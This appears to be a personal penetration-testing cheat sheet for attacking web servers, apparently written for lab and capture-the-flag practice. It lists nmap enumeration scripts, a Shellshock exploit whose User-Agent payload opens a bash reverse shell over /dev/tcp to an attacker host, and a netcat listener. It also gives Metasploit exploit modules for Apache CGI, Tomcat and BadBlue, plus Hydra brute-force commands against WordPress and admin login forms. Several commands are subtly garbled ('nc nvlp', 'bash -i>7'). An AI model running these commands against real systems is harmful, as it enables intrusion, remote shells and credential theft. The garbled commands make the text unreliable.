# http
#http #dirbuster #gobuster #enum Scan for different directories. Like dirb but a smaller and more specific set of directories

```bash
nmap --script http-enum -sV -p 80 $IP
```

```bash
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /content/: Potentially interesting folder
|   /downloads/: Potentially interesting folder
|_  /webdav/: Potentially interesting folder
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Headers
`nmap --script http-headers -sV -p 80 10.0.28.146`

### Methods
`nmap --script http-methods --script-args http-methods.url-path=/webdav/ 10.0.28.146`

shows methods (POST, GET, etc) on a specific path 

## Apache Web Server (LINUX)
### Shell Shock Vuln
>CVE-2014-6271. Reverse Shell. Executing CGI script via HTTP headers (via user agent)

![](</Images/Pasted image 20231209150204.png>)

Can use metasploit or Burpsuite.

To determine if the server is vulnerable use nmap
>`nmap -sV <ip> --script=http-shellshock --script-args "http-shellshock.uri=/<cgi sctipt>"`

Intercept request with Burp and enter above characters for the User Agent then command to run

For reverse shell set up listener

`nc nvlp 1234`

Then for burp `() { :; }; echo; echo; /bin/bash -c 'bash -i>7/dev/tcp/<ip address>/<port> 0>&1'`

metasploit method
search shellshock or use `exploit/multi/http/apache_mod_cgi_bash_env_exec`

### metasploit
#### web server enumeration
```
search type:auxiliary name:http
```

Metasploit version of dirbuster:
```
/auxiliary http/dir_scanner
```
```
/usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
```

Brute force http login:
 ```
 scanner/http/http_login
```

If that doesn't work can enum users in apache:
`scanner/http/apache_userdir_enum`

## HTTP File Server
#rejetto #http
Popular version: Rejetto HFS. v2.3 is vulnerable to RCE


## WordPress
#wordpress #hydra
Brute force with hydra
```bash
hydra -L wpusers -P /usr/share/wordlists/rockyou.txt colddboxeasy -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

## Apache Tomcat
#apache #tomcat #port-8080
![](</Images/Pasted image 20231225192424.png>)

With #metasploit to gain reverse shell:
```
exploit/multi/handler/tomcat_jsp_bypass
```
Use `check` to see if service is vulnerable


If credentials are located, use below to create and upload payload
	https://node-security.com/posts/jsp-war-shell

### Hydra Brute Force Web Login
```bash
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.10.240.45 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```
>form URI, login fail message

## Dirb

Easy use with default wordlist
```bash
dirb http://$IP
```

## Bad Blue Exploit


nmap results showing BadBlue version
```80/tcp open  http BadBlue httpd 2.7```

```bash
use exploit/windows/http/badblue_passthru
options
set RHOSTS $IP
run
```

